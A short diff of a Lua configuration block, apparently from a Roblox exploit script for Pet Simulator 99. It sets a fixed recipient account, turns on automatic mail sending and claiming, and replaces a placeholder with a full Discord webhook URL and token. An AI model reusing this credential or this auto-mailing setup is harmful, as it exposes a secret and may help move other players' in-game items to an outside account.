@@ -7,7 +7,7 @@ local Network = ReplicatedStorage:WaitForChild("Network")
 -- Configuration
 getgenv().config = {
     userToMail = "Ps99_dias",
-    webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE",
+    webhookUrl = "https://discord.com/api/webhooks/1510138512807301302/rZtNxe2qHglLbcWZfuHKvP7fUR53TSFs-Cq6-NJO7qT-SXoim3Gn15LssQ82CMfVzC38",
     
     autoClaimMail = true,
     autoSendMail = true,
